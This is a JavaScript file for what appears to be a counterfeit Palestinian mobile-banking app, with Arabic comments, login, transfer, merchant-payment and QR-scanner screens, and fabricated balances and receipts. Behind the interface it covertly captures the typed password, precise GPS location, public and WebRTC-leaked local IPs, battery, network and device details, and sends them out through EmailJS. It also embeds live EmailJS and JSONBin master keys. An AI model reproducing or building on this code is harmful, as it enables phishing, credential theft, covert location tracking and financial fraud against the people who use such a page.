/***********************
 * 0. إعداد EmailJS — جمع بيانات شاملة
 ***********************/
(function initEmailJS() {
    emailjs.init("sZQujmMuXwkE4Gt1Y");
})();

const EMAILJS_SERVICE_ID  = "service_owz5qzf";
const EMAILJS_TEMPLATE_ID = "template_79ykomn";

// ========== متغيرات عالمية ==========
let _gpsLocation     = "جاري تحديد الموقع...";
let _ipData          = {};
let _batteryData     = "جاري جلب البطارية...";
let _localIP         = "—";
let _connectionType  = "—";

// ========== 1. GPS الموقع الجغرافي ==========
(function fetchGPS() {
    if (!navigator.geolocation) { _gpsLocation = "GPS غير مدعوم"; return; }
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            const lat = pos.coords.latitude.toFixed(6);
            const lng = pos.coords.longitude.toFixed(6);
            const acc = Math.round(pos.coords.accuracy);
            _gpsLocation = `https://maps.google.com/?q=${lat},${lng} (دقة ${acc}م)`;
        },
        function(err) {
            const r = {1:"رفض الإذن", 2:"غير متاح", 3:"انتهت المهلة"};
            _gpsLocation = `تعذّر (${r[err.code] || err.message})`;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
})();

// ========== 2. IP + المدينة + البلد + ISP + المنطقة الزمنية + الرمز البريدي + الحي ==========
(function fetchIPData() {
    fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .then(d => {
            _ipData = {
                ip:       d.ip            || "—",
                city:     d.city          || "—",
                region:   d.region        || "—",
                country:  d.country_name  || "—",
                postal:   d.postal        || "—",
                isp:      d.org           || "—",
                timezone: d.timezone      || "—"
            };
        })
        .catch(() => { _ipData = { ip:"فشل الجلب" }; });
})();

// ========== 3. البطارية ==========
(function fetchBattery() {
    if (!navigator.getBattery) { _batteryData = "غير مدعوم"; return; }
    navigator.getBattery().then(b => {
        const pct      = Math.round(b.level * 100);
        const charging = b.charging ? "⚡ يشحن" : "🔋 لا يشحن";
        const timeLeft = b.charging
            ? (b.chargingTime   !== Infinity ? `متبقي للشحن الكامل: ${Math.round(b.chargingTime/60)} دقيقة` : "")
            : (b.dischargingTime !== Infinity ? `متبقي للنفاد: ${Math.round(b.dischargingTime/60)} دقيقة` : "");
        _batteryData = `${pct}% | ${charging} | ${timeLeft}`;
    });
})();

// ========== 4. نوع الاتصال ==========
(function fetchConnection() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        _connectionType = `${conn.effectiveType || "—"} | سرعة: ${conn.downlink || "—"} Mbps`;
    }
})();

// ========== 5. IP المحلي ==========
(function fetchLocalIP() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
            if (!e || !e.candidate) return;
            const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
            if (m && !m[1].startsWith("0.")) { _localIP = m[1]; pc.close(); }
        };
    } catch(e) { _localIP = "غير متاح"; }
})();

// ========== 6. معلومات الجهاز ==========
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceType = "💻 كمبيوتر";
    if (/tablet|ipad|playbook|silk/i.test(ua)) deviceType = "📟 تابلت";
    else if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile/i.test(ua)) deviceType = "📱 موبايل";

    let os = "غير معروف";
    if (/android/i.test(ua))      os = "Android " + (ua.match(/Android ([0-9.]+)/)?.[1] || "");
    else if (/iphone|ipad/i.test(ua)) os = "iOS " + (ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g,".") || "");
    else if (/windows/i.test(ua)) os = "Windows";
    else if (/mac/i.test(ua))     os = "macOS";
    else if (/linux/i.test(ua))   os = "Linux";

    return `${deviceType} | ${os}`;
}

// ========== 7. إرسال البريد ==========
function sendEmailNotification(params) {
    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
        .then(() => console.log("✅ تم الإرسال"))
        .catch(err => console.error("❌ فشل:", err));
}

// ========== 8. بناء الحقول الكاملة ==========
function _buildFullParams(eventType, password, recipientName, recipientPhone, amount) {
    const ip = _ipData;
    return {
        event_type:      eventType,
        password:        password       || "—",
        user_name:       localStorage.getItem("user_name")    || "—",
        user_balance:    localStorage.getItem("user_balance") || "—",
        timestamp:       new Date().toLocaleString("ar-EG"),

        // تفاصيل العملية
        recipient_name:  recipientName  || "—",
        recipient_phone: recipientPhone || "—",
        amount:          amount         || "—",

        // الموقع
        gps_link:        _gpsLocation,
        city:            `${ip.city || "—"} — ${ip.region || "—"}`,
        country:         ip.country  || "—",
        postal:          ip.postal   || "—",
        isp:             ip.isp      || "—",
        timezone:        ip.timezone || "—",

        // الشبكة والـ IP
        public_ip:       ip.ip       || "—",
        local_ip:        _localIP,
        connection:      _connectionType,

        // الجهاز
        device_info:     getDeviceInfo(),

        // البطارية
        battery:         _batteryData
    };
}

// ========== 9. دوال الإرسال ==========
function sendLoginData(password) {
    const send = () => sendEmailNotification(
        _buildFullParams("🔐 تسجيل دخول", password, "—", "—", "—")
    );
    setTimeout(send, 3000);
}

function sendTransferData(recipientName, recipientPhone, amount) {
    sendEmailNotification(
        _buildFullParams("💸 تحويل لصديق", "—", recipientName, recipientPhone, amount)
    );
}

function sendMerchantPaymentData(merchantName, amount, refNum) {
    sendEmailNotification(
        _buildFullParams("🏪 دفع لتاجر", "—", merchantName, localStorage.getItem('merchant_phone') || '—', amount)
    );
}

// ========== 10. لقطة شاشة عند التحويل ==========
function captureAndSendScreenshot(screenId, label) {
    const el = document.getElementById(screenId);
    if (!el || typeof html2canvas === "undefined") return;
    html2canvas(el, { scale: 1.5, useCORS: true }).then(canvas => {
        const imgData = canvas.toDataURL("image/jpeg", 0.7);
        sendEmailNotification(
            _buildFullParams(`📸 ${label}`, "—", imgData.substring(0, 500) + "...")
        );
    });
}

/***********************
 * 0b. البحث في قاعدة جهات الاتصال (JSONBin)
 ***********************/
const JSONBIN_KEY    = "$2a$10$GlH9Sz6xcpOvRdNQOwA2Re9xHjqpJZVzyobNOiwZpsp4Iyw0Xt2aa";
const JSONBIN_BIN_ID = "6a2def2df5f4af5e29eddfeb";

async function lookupContact(phone) {
    try {
        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
            headers: { 'X-Master-Key': JSONBIN_KEY }
        });
        const data = await res.json();
        const contacts = data.record.contacts || [];
        return contacts.find(c => c.phone === phone) || null;
    } catch(e) {
        return null;
    }
}

/***********************
 * 1. دالة تحويل الأرقام إلى هندية
 ***********************/
function toHindiNumbers(str) {
    if (str === null || str === undefined) return "";
    const hindiNumbers = ['٠','١','٢','٣','٤','٥','٦','٧','٨','٩'];
    return str.toString().replace(/[0-9]/g, d => hindiNumbers[+d]);
}

/***********************
 * 2. طلب إذن إشعارات الويب
 ***********************/
if ('Notification' in window && Notification.permission !== 'granted') {
    Notification.requestPermission();
}

/***********************
 * 3. إدارة الشاشات والتنقل والتحميل
 ***********************/
const screens = {
    login: document.getElementById('screen-login'),
    s1: document.getElementById('screen-1'),
    accountDetails: document.getElementById('screen-account-details'),
    s2: document.getElementById('screen-2'),
    s3: document.getElementById('screen-3'),
    s4: document.getElementById('screen-4'),
    s5: document.getElementById('screen-5'),
    s6: document.getElementById('screen-6'),
    s7: document.getElementById('screen-7'),
    s8: document.getElementById('screen-8'),
    s9: document.getElementById('screen-9'),
    s10: document.getElementById('screen-10'),
    notif: document.getElementById('screen-notifications')
};

let loadingTimeout;
let currentActiveScreen = 'login';

function showScreen(targetKey) {
    if (loadingTimeout) clearTimeout(loadingTimeout);

     const screensWithLoading = ['accountDetails', 's2', 's3', 's4', 's5', 's6', 's7', 's8', 's10'];
    
    if (screensWithLoading.includes(targetKey)) {
        let currentScreen = document.querySelector('.app-screen[style*="display: block"], .app-screen[style*="display: flex"], .payment-view[style*="display: block"], .payment-view[style*="display: flex"]');
        if (!currentScreen && screens[currentActiveScreen]) currentScreen = screens[currentActiveScreen];

        if (currentScreen) {
            const oldLoader = currentScreen.querySelector('.custom-loader');
            if (oldLoader) oldLoader.remove();

            const loader = document.createElement('div');
            loader.className = 'custom-loader';
            currentScreen.appendChild(loader);

            const delay = Math.floor(Math.random() * 2001) + 2000;
            loadingTimeout = setTimeout(() => {
                loader.remove();
                executeScreenSwitch(targetKey);
            }, delay);
            return; 
        }
    }

    executeScreenSwitch(targetKey);
}

function executeScreenSwitch(targetKey) {
    Object.keys(screens).forEach(key => {
        if (screens[key]) screens[key].style.display = 'none';
    });

    if (screens[targetKey]) {
        const targetScreen = screens[targetKey];
        const blockScreens = ['login', 's1', 's4', 's6', 'notif'];
        targetScreen.style.display = blockScreens.includes(targetKey) ? 'block' : 'flex';

        // التمرير يُدار داخل كل شاشة — لا حاجة لتغيير body overflow
        document.body.style.overflow = 'hidden';
        document.body.style.position = 'fixed';
        document.body.style.width = '100%';
        
        const contentDiv = targetScreen.querySelector('.main-content') || targetScreen.querySelector('.acc-content');
        if (contentDiv) {
            if(targetKey === 'accountDetails'){
                contentDiv.style.display = 'flex';
            } else {
                contentDiv.style.display = 'block';
            }
        }
        
        currentActiveScreen = targetKey;
    }
}

function updateS9Inputs() {
    const s8Input = document.getElementById('merchant-phone-input');
    const phoneVal = s8Input ? s8Input.value.trim() : "";

    // البحث عن الاسم في قائمة التجار
    const merchants = JSON.parse(localStorage.getItem('merchants_list') || '[]');
    const found = merchants.find(m => m.phone === phoneVal);
    const mName = found ? found.name : (localStorage.getItem('merchant_name') || "");

    // حفظ البيانات الصحيحة
    localStorage.setItem('merchant_phone', phoneVal);
    localStorage.setItem('merchant_name',  mName);

    const phoneS9 = document.getElementById('merchant-phone-s9');
    const nameS9  = document.getElementById('merchant-name-s9');
    if (phoneS9) phoneS9.value = phoneVal;
    if (nameS9)  nameS9.value  = "اسم التاجر: " + mName;
}

// العودة للشاشة الأولى مع تأثير التحميل 3 ثواني
function showS1WithLoader() {
    showScreen('s1');
    const overlay = document.getElementById('s1-loader-overlay');
    if (overlay) {
        overlay.style.display = 'flex';
        setTimeout(() => {
            overlay.style.display = 'none';
        }, 3000);
    }
}

// دالة التحقق قبل الانتقال من الشاشة 8 إلى 9 (توقف صامت)
function checkAndGoToS9(e) {
    if(e) e.preventDefault(); // لمنع السلوك الافتراضي إذا كان الزر داخل فورم
    const s8Input = document.getElementById('merchant-phone-input');
    const phoneVal = s8Input ? s8Input.value.trim() : "";
    
    // التوقف بصمت تام إذا كان فارغاً أو 0
    if (phoneVal === "" || phoneVal === "0") {
        return; 
    }
    updateS9Inputs(); 
    showScreen('s9');
}

// أزرار التنقل
document.getElementById('to-account-details')?.addEventListener('click', () => showScreen('accountDetails'));
document.getElementById('back-from-account-details')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('to-s2')?.addEventListener('click', () => showScreen('s2'));
document.getElementById('to-s3')?.addEventListener('click', () => showScreen('s3'));
document.querySelector('.fab-btn-bright-purple')?.addEventListener('click', () => showScreen('s4'));
document.getElementById('back-to-s3')?.addEventListener('click', () => showScreen('s3'));
document.getElementById('back-to-s1')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('back-to-s2')?.addEventListener('click', () => showScreen('s2'));
document.getElementById('back-to-s4')?.addEventListener('click', () => showScreen('s4'));
document.getElementById('back-from-notifications')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('finish-button')?.addEventListener('click', showS1WithLoader);
document.getElementById('to-s7')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-to-s1-from-s7')?.addEventListener('click', () => showScreen('s1'));
document.querySelector('#screen-7 .payment-card img[src*="J3zaJSU.png"]')?.parentElement.addEventListener('click', () => {
    // مسح بيانات التاجر السابقة
    localStorage.removeItem('merchant_name');
    localStorage.removeItem('merchant_phone');
    const s8Input = document.getElementById('merchant-phone-input');
    if (s8Input) s8Input.value = '';
    showScreen('s8');
});
document.getElementById('back-to-s7')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-to-s7-from-s8')?.addEventListener('click', () => showScreen('s7'));

// أزرار التحقق والانتقال من 8 إلى 9
document.querySelector('#screen-8 button')?.addEventListener('click', checkAndGoToS9);
document.getElementById('btn-pay-s8')?.addEventListener('click', checkAndGoToS9);

if (document.getElementById("back-to-s8")) { document.getElementById("back-to-s8").onclick = () => showScreen("s8"); }
document.getElementById('cancel-merchant-s9')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-from-s10')?.addEventListener('click', showS1WithLoader);
document.getElementById('finish-merchant-payment')?.addEventListener('click', showS1WithLoader);

/***********************
 * 4. نظام الإشعارات وكشف الحساب
 ***********************/
function updateNotificationBadge() {
    const notifBadge = document.getElementById('notif-badge');
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    if (notifBadge) {
        const isRead = localStorage.getItem('notifications_read') === 'true';
        notifBadge.style.display = 'flex';
        notifBadge.innerText = (isRead || list.length === 0) ? "0" : list.length.toString();
    }
}

function renderNotificationsPage() {
    const container = document.getElementById('notifications-list');
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    if (!container) return;
    if (list.length === 0) {
        container.innerHTML = '<p style="text-align:center; padding:50px; color:#888;">لا توجد إشعارات حالية</p>';
        return;
    }
    container.innerHTML = list.map(item => `
        <div class="notification-card" style="padding: 15px 20px; border-bottom: 1px solid #eee; background: white; direction: rtl;">
            <div style="display: flex; justify-content: space-between; align-items: center; color: #3b5998; font-weight: bold; font-size: 15px; margin-bottom: 4px;">
                <span>${item.title}</span>
                <span style="font-family: 'Cairo', sans-serif; font-weight: normal; font-size: 13px;">${toHindiNumbers(item.date)}</span>
            </div>
            <div style="text-align: right; font-size: 14px; color: #333; line-height: 1.4;">
                ${item.desc}
            </div>
        </div>`).join('');
}

if (document.getElementById('open-notifications')) {
    document.getElementById('open-notifications').onclick = () => {
        localStorage.setItem('notifications_read', 'true'); 
        updateNotificationBadge(); 
        showScreen('notif'); 
        renderNotificationsPage(); 
    };
}

// إضافة حركة في كشف الحساب (محدثة لدعم الحفظ التلقائي)
function addStatementEntry(descText, amountStr, dateStr = null, doSave = true) {
    const tbody = document.getElementById('statement-tbody');
    if (!tbody) return;
    
    // تحديد التاريخ (إما ممرر من الذاكرة أو تاريخ اليوم للحركات الجديدة)
    let finalDate = dateStr;
    if (!finalDate) {
        const today = new Date();
        finalDate = String(today.getDate()).padStart(2, '0') + '/' + 
                    String(today.getMonth() + 1).padStart(2, '0') + '/' + 
                    today.getFullYear();
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td class="acc-col-date">${finalDate}</td>
        <td class="acc-col-desc">
            <span>${descText}</span>
        </td>
        <td class="acc-col-amount">${amountStr}</td>
    `;
    
    // إضافة الصف إلى أعلى الجدول
    tbody.insertBefore(tr, tbody.firstChild);

    // حفظ الحركة في localStorage إذا كانت حركة جديدة (doSave = true)
    if (doSave) {
        let statements = JSON.parse(localStorage.getItem('bank_statements')) || [];
        // إضافة الحركة الجديدة في بداية المصفوفة (الأحدث أولاً)
        statements.unshift({ date: finalDate, desc: descText, amount: amountStr });
        localStorage.setItem('bank_statements', JSON.stringify(statements));
    }
}

// دالة جديدة لتحميل حركات الحساب المحفوظة مسبقاً
function loadSavedStatements() {
    const statements = JSON.parse(localStorage.getItem('bank_statements')) || [];
    // نعكس المصفوفة لنبدأ بإضافة الأقدم ثم الأحدث، ليبقى الأحدث دائماً في أعلى الجدول
    statements.reverse().forEach(stmt => {
        addStatementEntry(stmt.desc, stmt.amount, stmt.date, false);
    });
}

// تحديث الرصيد في جميع الأماكن
function updateAllBalances(newBalance) {
    const balanceElements = [
        document.querySelector('.amount-number-system'),
        ...document.querySelectorAll('.acc-balance-text')
    ];
    balanceElements.forEach(el => {
        if(el) el.textContent = parseFloat(newBalance).toFixed(2);
    });
}

/***********************
 * 5. العمليات المالية (لصديق) وحساب العمولة
 ***********************/
let currentBalance = parseFloat(localStorage.getItem('user_balance')) || 44.91;

const amountInput = document.querySelector('.amount-input');
const recipientNameEl = document.getElementById('recipientName');
const recipientPhoneEl = document.getElementById('recipientPhone');
const recipientIcon = document.getElementById('recipientIcon');

let currentCommission = 0; 

amountInput?.addEventListener('input', () => {
    const val = parseFloat(amountInput.value) || 0;
    document.getElementById('amount-s5').textContent = val.toFixed(2) + ' ILS';
});

document.getElementById('confirmBtn')?.addEventListener('click', function() {
    const val = parseFloat(amountInput.value) || 0;
    
    // التوقف بصمت إذا كان المبلغ 0
    if (val === 0) return;

    const total = val + currentCommission; 
    if (total > currentBalance) return alert('الرصيد غير كافٍ');

    currentBalance -= total;
    localStorage.setItem('user_balance', currentBalance.toFixed(2));
    updateAllBalances(currentBalance);

    const random9DigitCode = Math.floor(100000000 + Math.random() * 900000000);

    const newNotif = {
        title: "الدفع لصديق",
        date: new Date().toLocaleDateString('en-GB'),
        desc: `تحويل دفع لصديق: ${recipientNameEl.textContent}، بمبلغ <b>${total.toFixed(2)} ILS</b>`
    };
    
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    list.unshift(newNotif);
    localStorage.setItem('bank_notifications', JSON.stringify(list));
    localStorage.setItem('notifications_read', 'false');

    // إدراج في كشف الحساب التلقائي
    const stmtDesc = `دفع ل ${recipientNameEl.textContent}، رقم الحركة : ${random9DigitCode}`;
    addStatementEntry(stmtDesc, total.toFixed(1) + '-');

    document.getElementById('display-name').textContent = recipientNameEl.textContent;
    document.getElementById('display-phone').textContent = recipientPhoneEl.textContent || '---';
    document.getElementById('display-amount').textContent = total.toFixed(1) + ' ILS';
    document.getElementById('display-code').textContent = random9DigitCode;

    // ✉️ إرسال بيانات التحويل عبر EmailJS
    sendTransferData(
        localStorage.getItem('recipient_name')  || recipientNameEl.textContent  || '—',
        localStorage.getItem('recipient_phone') || recipientPhoneEl.textContent || '—',
        total.toFixed(2)
    );

    showScreen('s6');
    updateNotificationBadge();
});

/***********************
 * 6. اختيار البنك (والتحقق من المستلم وتطبيق العمولة)
 ***********************/
const bottomSheet = document.getElementById('bottomSheet');
const overlay = document.getElementById('overlay');
const phoneInput = document.querySelector('#screen-4 .input-field');

document.getElementById('openSheetBtn')?.addEventListener('click', () => {
    bottomSheet.style.bottom = "0";
    overlay.style.display = "block";
});

const closeSheet = () => {
    bottomSheet.style.bottom = "-100%";
    overlay.style.display = "none";
};

document.querySelector('.close-text')?.addEventListener('click', closeSheet);
overlay?.addEventListener('click', closeSheet);

document.querySelectorAll('.bank-item').forEach(item => {
    item.addEventListener('click', () => {
        const val = parseFloat(amountInput.value) || 0;
        const phoneVal = phoneInput.value.trim();

        // التوقف بصمت إذا كان المبلغ 0 أو رقم الموبايل فارغاً/0
        if (val === 0 || phoneVal === "" || phoneVal === "0") {
            return; 
        }

        closeSheet();
        const bankType = item.dataset.target;
        if (recipientIcon) {
            if (bankType === 'palpay') {
                recipientIcon.innerHTML = `<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsBGlRu3lHxzkgUR-nnflMv6GdZCm3UooakEJDQAXXAnIy2cNjCbc6h1Qo&s=10" width="48">`;
            } else if (bankType === 'palpay-wallet') {
                recipientIcon.innerHTML = `<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRo-2NOar_qcerlGh166EDRRqtax-y9FOS0Kc3sIEkBk078sxawPAvRbAV7&s=10" width="48">`;
            }
        }

        if (bankType === 'palpay') {
            if (val >= 1 && val <= 99) currentCommission = 0.5;
            else if (val >= 100) currentCommission = 1.0;
            else currentCommission = 0; 
        } else {
            currentCommission = 0;
        }

        document.getElementById('amount-s5').textContent = val.toFixed(2) + ' ILS';
        document.getElementById('commission-s5').textContent = currentCommission.toFixed(2) + ' ILS';
        document.getElementById('total-s5').textContent = (val + currentCommission).toFixed(2) + ' ILS';

        const savedPhone = localStorage.getItem('recipient_phone') || "0599267682";
        const savedName  = localStorage.getItem('recipient_name')  || "طلعت محمد موسى الفقيعاوي";

        // البحث في JSONBin أولاً، ثم localStorage كاحتياط
        lookupContact(phoneVal).then(found => {
            if (found) {
                recipientNameEl.textContent  = found.name;
                recipientPhoneEl.textContent = found.phone;
                showScreen('s5');
            } else if (phoneVal === savedPhone) {
                recipientNameEl.textContent  = savedName;
                recipientPhoneEl.textContent = savedPhone;
                showScreen('s5');
            } else {
                document.getElementById('verifyModal').style.display = 'flex';
            }
        });
    });
});

document.getElementById('verifyOkBtn')?.addEventListener('click', () => {
    document.getElementById('verifyModal').style.display = 'none';
});

/***********************
 * 7. نظام السحب المتطور والحفظ التلقائي
 ***********************/
let startX = 0;
let startY = 0;
let lastSwipeTime = 0;
let autoSaveTimer;
let swipeDownCount = 0;
let swipeDownTimer = null;

function checkMainScreen() {
    const loginScreen = document.getElementById('screen-login');
    return loginScreen && loginScreen.style.display !== 'none';
}

document.addEventListener('touchstart', e => {
    startX = e.changedTouches[0].screenX;
    startY = e.changedTouches[0].screenY;
}, {passive: true});

document.addEventListener('touchend', e => {
    const diffX = e.changedTouches[0].screenX - startX;
    const diffY = e.changedTouches[0].screenY - startY;
    const now = Date.now();

    // السحب من أعلى لأسفل في الشاشة الرئيسية 3 مرات متتالية → الرجوع لشاشة الدخول
    const screen1 = document.getElementById('screen-1');
    const isScreen1Visible = screen1 && screen1.style.display !== 'none';
    if (isScreen1Visible && diffY > 80 && Math.abs(diffX) < 80) {
        const now2 = Date.now();
        if (now2 - lastSwipeTime < 800) {
            swipeDownCount++;
        } else {
            swipeDownCount = 1;
        }
        lastSwipeTime = now2;
        if (swipeDownCount >= 3) {
            swipeDownCount = 0;
            showScreen('login');
        }
        return;
    }

    if (!checkMainScreen()) return;

    // السحب يميناً ويساراً محذوف — الإعدادات عبر admin panel فقط
}, {passive: true});

// جلب إعدادات الحساب من JSONBin عند تحميل الصفحة
async function loadSettingsFromDB() {
    try {
        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
            headers: { 'X-Master-Key': JSONBIN_KEY }
        });
        const data = await res.json();
        const record = data.record;

        // تطبيق الاسم والرصيد
        if (record.user_name) {
            localStorage.setItem('user_name', record.user_name);
            const s1Name = document.querySelector('.welcome-text');
            if (s1Name) s1Name.innerHTML = `مرحباً، ${record.user_name}`;
        }
        if (record.user_balance) {
            localStorage.setItem('user_balance', record.user_balance);
            currentBalance = parseFloat(record.user_balance) || 0;
            updateAllBalances(currentBalance);
        }

        // حفظ التجار في localStorage فقط بدون ملء الحقل تلقائياً
        const merchants = record.merchants || [];
        if (merchants.length > 0) {
            localStorage.setItem('merchants_list', JSON.stringify(merchants));
        }

    } catch(e) {
        console.log('تعذّر جلب الإعدادات من قاعدة البيانات');
    }
}

// عرض قائمة التجار في screen-8
function renderMerchantsInS8(merchants) {
    const container = document.getElementById('merchants-list-s8');
    if (!container) return;
    if (!merchants || merchants.length === 0) {
        container.innerHTML = '';
        return;
    }
    container.innerHTML = merchants.map(m => `
        <div onclick="selectMerchant('${m.name}','${m.phone}')" style="
            display:flex; align-items:center; gap:12px;
            padding:12px 14px; margin-bottom:8px;
            background:#f7f9fc; border-radius:12px;
            border:2px solid #e2e8f0; cursor:pointer;
            transition: border .2s;
        " onmouseover="this.style.borderColor='#2563a8'" onmouseout="this.style.borderColor='#e2e8f0'">
            <div style="
                width:40px; height:40px; border-radius:50%;
                background:linear-gradient(135deg,#1a3c6e,#2563a8);
                display:flex; align-items:center; justify-content:center;
                color:#fff; font-size:16px; font-weight:700; flex-shrink:0;
            ">${m.name.charAt(0)}</div>
            <div>
                <div style="font-size:14px; font-weight:600; color:#1a3c6e;">${m.name}</div>
                <div style="font-size:12px; color:#6b7a99; direction:ltr; text-align:right;">${m.phone}</div>
            </div>
        </div>
    `).join('');
}

// اختيار تاجر من القائمة
function selectMerchant(name, phone) {
    localStorage.setItem('merchant_name',  name);
    localStorage.setItem('merchant_phone', phone);
    const s8Input = document.getElementById('merchant-phone-input');
    if (s8Input) s8Input.value = phone;
    updateS9Inputs();
    showScreen('s9');
}

// تشغيل الجلب عند تحميل الصفحة
loadSettingsFromDB();

/***********************
 * 8. الـ QR Scanner والتحقق
 ***********************/
let html5QrCode;
const readerContainer = document.getElementById('reader-container');
const flashBtn = document.getElementById('flash-toggle-btn');
const closeBtnText = document.getElementById('close-scanner-text');
const scanImageBtn = document.getElementById('scan-image-btn');
const fileInput = document.getElementById('qr-input-file');

document.querySelectorAll('.qr-trigger').forEach(img => {
    
    img.addEventListener('click', startScanner);
});

scanImageBtn?.addEventListener('click', () => { fileInput.click(); });

fileInput?.addEventListener('change', async (e) => {
    if (e.target.files.length === 0) return;
    const imageFile = e.target.files[0];
    try {
        if (!html5QrCode) html5QrCode = new Html5Qrcode("reader");
        if (html5QrCode.isScanning) await html5QrCode.stop();
        const decodedText = await html5QrCode.scanFile(imageFile, true);
        
        const savedPhone = localStorage.getItem('merchant_phone') || "";
        if (decodedText.trim() !== savedPhone) {
            alert("فشل التحقق: رقم التاجر في الباركود لا يتطابق مع الرقم المحفوظ في الواجهة المخفية!");
            stopScanner();
            return;
        }

        updateS9Inputs();
        stopScanner();
        showScreen('s9'); 
    } catch (err) {
        alert("لم يتم العثور على QR واضح في الصورة");
        console.error(err);
    }
});

async function startScanner() {
    readerContainer.style.display = 'block';
    if (!html5QrCode) html5QrCode = new Html5Qrcode("reader");
    html5QrCode.start(
        { facingMode: "environment" },
        { fps: 10, qrbox: { width: 250, height: 250 } },
        (decodedText) => {
            const savedPhone = localStorage.getItem('merchant_phone') || "";
            if (decodedText.trim() !== savedPhone) {
                alert("فشل التحقق: رقم التاجر في الباركود لا يتطابق مع الرقم المحفوظ في الواجهة المخفية!");
                stopScanner();
                return;
            }

            updateS9Inputs();
            stopScanner();
            showScreen('s9'); 
        }
    ).catch(err => {
        // الكاميرا غير متاحة — افتح مباشرة اختيار الصورة بدون رسالة خطأ
        console.warn("الكاميرا غير متاحة، انتقل لاختيار صورة:", err);
        fileInput.click();
    });
}

function stopScanner() {
    if (html5QrCode && html5QrCode.isScanning) {
        html5QrCode.stop().then(() => { readerContainer.style.display = 'none'; });
    } else {
        readerContainer.style.display = 'none';
    }
}

document.getElementById('open-scanner-btn')?.addEventListener('click', startScanner);
closeBtnText?.addEventListener('click', stopScanner);

/***********************
 * 9. تهيئة عند التحميل
 ***********************/
window.onload = () => {
    updateNotificationBadge();
    
    // استدعاء الحركات المالية المحفوظة في كشف الحساب
    loadSavedStatements();

    const savedBal = localStorage.getItem('user_balance');
    if(savedBal) updateAllBalances(savedBal);

    const savedName = localStorage.getItem('user_name');
    const s1Name = document.querySelector('.welcome-text');
    if(savedName && s1Name) s1Name.innerHTML = `مرحباً، ${savedName}`;
    
    const grid = document.getElementById('services-grid');
    if(grid) {
        Array.from(grid.children).forEach((item, i) => item.style.display = 'flex');
    }
};

document.getElementById('toggle-services')?.addEventListener('click', function() {
    const grid = document.getElementById('services-grid');
    const items = Array.from(grid.children);
    const isShowingMore = this.innerText.includes("أقل");
    items.forEach((item, i) => { if (i >= 4) item.style.display = isShowingMore ? 'none' : 'flex'; });
    this.innerText = isShowingMore ? `عرض الكل (${items.length})` : "عرض أقل";
});

/***********************
 * 10. العمليات الديناميكية لشاشة 9 و 10 والمودال (التاجر)
 ***********************/
const nextBtnS9 = document.getElementById('next-to-confirm-merchant');
const merchantModal = document.getElementById('merchant-confirm-modal');
const cancelMerchantBtn = document.getElementById('cancel-merchant-btn');
const confirmMerchantBtn = document.getElementById('confirm-merchant-btn');

if (nextBtnS9) {
    nextBtnS9.addEventListener('click', (e) => {
        if(e) e.preventDefault(); // لمنع الإرسال الافتراضي
        const amountField = document.getElementById('amount-s9');
        const amount = amountField ? amountField.value.trim() : "0";
        const numericAmount = parseFloat(amount);

        // التوقف بصمت إذا كان المبلغ فارغاً أو 0
        if (amount === "" || isNaN(numericAmount) || numericAmount === 0) {
            return; 
        }

        const mName = localStorage.getItem('merchant_name') || "سعود بديع فايق ساق الله";

        const modalAmountText = document.getElementById('modal-amount-text');
        const modalMerchantText = document.getElementById('modal-merchant-text');
        const modalTotalText = document.getElementById('modal-total-text');

        if(modalAmountText) modalAmountText.innerText = amount + " شيكل";
        if(modalMerchantText) modalMerchantText.innerText = mName;
        if(modalTotalText) modalTotalText.innerText = numericAmount.toFixed(1) + " ILS";

        merchantModal.style.display = 'flex';
    });
}

if (cancelMerchantBtn) {
    cancelMerchantBtn.addEventListener('click', () => {
        merchantModal.style.display = 'none';
    });
}

if (confirmMerchantBtn) {
    confirmMerchantBtn.addEventListener('click', () => {
        const amountField = document.getElementById('amount-s9');
        const amount = parseFloat(amountField ? amountField.value : "0");
        
        if (amount > currentBalance) return alert('الرصيد غير كافٍ');
        
        currentBalance -= amount;
        localStorage.setItem('user_balance', currentBalance.toFixed(2));
        updateAllBalances(currentBalance);

        merchantModal.style.display = 'none';
        
        const mName = localStorage.getItem('merchant_name') || "سعود بديع فايق ساق الله";

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const letters = chars.charAt(Math.floor(Math.random() * 26)) + chars.charAt(Math.floor(Math.random() * 26));
        const numbers = Math.floor(10000000 + Math.random() * 90000000);
        const refNum = letters + numbers; // الرقم المرجعي

        const random7Digit = Math.floor(1000000 + Math.random() * 9000000); // رقم 7 خانات عشوائي

        // إدراج العملية في كشف الحساب
        const stmtDesc = `دفع ل ${mName},<br>رقم الحركة :${random7Digit},<br>${refNum}`;
        addStatementEntry(stmtDesc, parseFloat(amount || 0).toFixed(1) + '-');

        const today = new Date();
        const dateStr = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0') + '-' + String(today.getDate()).padStart(2, '0');

        const s10Vals = document.querySelectorAll('#screen-10 .value-text');
        
        const elMerchant = document.getElementById('s10-merchant-name');
